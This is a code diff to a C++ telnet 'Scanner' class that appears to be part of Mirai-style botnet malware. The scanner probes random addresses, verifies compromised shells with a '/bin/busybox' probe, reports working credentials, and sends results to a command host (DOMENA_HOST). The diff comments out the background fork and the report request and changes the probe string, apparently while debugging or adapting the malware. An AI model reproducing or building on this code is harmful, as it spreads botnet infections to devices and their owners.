@@ -64,9 +64,9 @@ class Scanner {
   public:
     void ignite () {
       // Let the parent process continue running on the main thread.
-      scanner_pid = fork();
-      if (scanner_pid > 0 || scanner_pid == -1)
-        return;
+      // scanner_pid = fork();
+      // if (scanner_pid > 0 || scanner_pid == -1)
+      //   return;
 
       LOCAL_ADDR = util_local_addr();
 
@@ -463,7 +463,7 @@ class Scanner {
                     report_working(random_address.str_addr, conn->dst_port, conn->auth);
 
                     // Send query string
-                    tmp_str = (char *) O("/bin/busybox XENA");
+                    tmp_str = (char *) O("/bin/busybox ASDDDF");
                     send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                     send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
@@ -495,7 +495,9 @@ class Scanner {
                     #if defined(TALK)
                     printf("FD%d Found verified working telnet\n", conn->fd);
                     #endif
+
                     report_working(random_address.str_addr, conn->dst_port, conn->auth);
+                    
                     close(conn->fd);
                     conn->fd = -1;
                     conn->state = scanner_connection::SC_CLOSED;
@@ -624,6 +626,7 @@ class Scanner {
       payload += O("\"}");
       payload += O("}");
 
+      /*
       Request req {
         DOMENA_HOST,
         DOMENA_PORT,
@@ -642,6 +645,7 @@ class Scanner {
         std::cout << e.what() << std::endl; 
         #endif
       }
+      */
     }
 
     int consume_resp_prompt (struct scanner_connection * conn) {
